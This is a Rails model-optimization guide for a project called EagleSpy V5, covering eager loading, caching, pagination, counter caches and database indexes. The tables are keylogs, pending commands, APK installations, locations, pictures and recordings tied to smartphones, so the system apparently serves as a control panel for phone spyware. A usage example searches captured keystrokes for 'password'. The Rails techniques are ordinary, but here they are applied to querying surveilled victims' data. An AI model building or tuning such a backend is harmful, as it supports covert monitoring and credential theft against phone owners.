# Model Optimization Guide

## Overview

This document describes the Rails model optimizations implemented in EagleSpy V5 to prevent N+1 queries, improve cache efficiency, and support large-table pagination.

---

## Concerns

### `EagerLoadable` (`app/models/concerns/eager_loadable.rb`)

Prevents N+1 queries by declaring associations to preload in list views.

```ruby
class Smartphone < ApplicationRecord
  include EagerLoadable
  eager_load_associations :apk_installation, :pending_commands
end

# Usage
Smartphone.with_preloaded           # preload (no JOIN, separate queries)
Smartphone.with_included            # includes (allows WHERE on associations)
Smartphone.find_each_with_preload { |s| ... }  # batch iteration
```

### `Cacheable` (`app/models/concerns/cacheable.rb`)

Provides record- and collection-level caching with automatic invalidation on `after_commit`.

```ruby
class Smartphone < ApplicationRecord
  include Cacheable
  cache_ttl 5.minutes
end

# Instance caching
device.cached_fetch(:summary) { expensive_computation }
device.invalidate_cache!

# Collection caching
Smartphone.cached_collection(:total_active) { where(...).count }
```

### `Paginatable` (`app/models/concerns/paginatable.rb`)

Two pagination strategies for different table sizes:

```ruby
# Cursor-based (fast for large tables — no COUNT, no OFFSET)
Keylog.where(smartphone_id: 1).cursor_paginate(after: last_id, limit: 50)
# => { records: [...], has_more: true, cursor: 42 }

# Offset-based (with cached total count)
Keylog.where(smartphone_id: 1).offset_paginate(page: 3, per_page: 25)
# => { records: [...], page: 3, per_page: 25, total: 1200, total_pages: 48 }
```

**Page size** is capped at `MAX_PAGE_SIZE = 100`.

---

## Smartphone Scopes

| Scope | Purpose |
|-------|---------|
| `with_recent_commands(since:)` | Devices with commands created after `since` |
| `with_location` | Devices that have at least one geo_location |
| `with_stats` | Subselect-based counts (keylogs, commands) without JOINs |
| `active_since(time)` | EXISTS-based check for recent keylogs or locations |

---

## Counter Caches

The migration `20260213100000_add_model_optimizations` adds:

| Column | Table | Tracked Model |
|--------|-------|---------------|
| `keylogs_count` | `smartphones` | `Keylog` |
| `commands_count` | `smartphones` | `PendingCommand` |

To use counter caches, add `counter_cache: true` to `belongs_to`:

```ruby
class Keylog < ApplicationRecord
  belongs_to :smartphone, counter_cache: true
end
```

---

## OptimizedQueries Service

`app/services/optimized_queries.rb` provides pre-built queries:

| Method | Description |
|--------|-------------|
| `device_dashboard(id)` | Single query for all device stats |
| `location_history(id, after:, limit:)` | Cursor-paginated location history |
| `keylog_search(id, query)` | ILIKE search with trigram index |
| `command_history(id, status:)` | Filtered command history |
| `devices_with_latest_data(time_range:)` | Batch-load with eager loading |
| `recent_keylogs_cursor(id, after:, limit:)` | Cursor-based keylog pagination |

---

## Database Indexes

### Migration: `20260213100000_add_model_optimizations`

**Composite indexes:**
- `keylogs(smartphone_id, app_package, created_at DESC)`
- `geo_locations(smartphone_id, date)`
- `pictures(smartphone_id, date)`
- `recordings(smartphone_id, date)`

**Partial indexes:**
- `keylogs(smartphone_id, created_at DESC) WHERE created_at > NOW() - 24h`
- `pending_commands(smartphone_id, created_at DESC) WHERE status = 0`

**Trigram index (requires `pg_trgm`):**
- `keylogs(keystroke) USING gin(gin_trgm_ops)` — enables fast ILIKE search

### Pre-existing indexes (from `20260208135800`)

All `smartphone_id + created_at` composites already exist for the core tables.

---

## Caching Configuration

`config/initializers/caching.rb` configures:

| Environment | Cache Store | Default TTL |
|-------------|-------------|-------------|
| Production / Staging | Redis (via `REDIS_URL`) | 5 min |
| Development | Memory (64MB cap) | 5 min |
| Test | Null store | N/A |

Override TTL with `CACHE_DEFAULT_TTL` env var (seconds).

---

## Usage Examples

### Dashboard Controller

```ruby
# Before (N+1)
@devices = Smartphone.all
@devices.each { |d| d.keylogs.count }

# After (single query)
@devices = OptimizedQueries.device_dashboard
```

### Keylog Search

```ruby
# Paginated search with trigram index
results = OptimizedQueries.keylog_search(device.id, "password", page: 1)
```

### Location History (infinite scroll)

```ruby
result = OptimizedQueries.location_history(device.id, after: params[:cursor], limit: 50)
render json: { locations: result[:records], has_more: result[:has_more], cursor: result[:cursor] }
```

---

## Running the Migration

```bash
rails db:migrate
```

The migration is idempotent — it checks for existing columns and indexes before adding them.
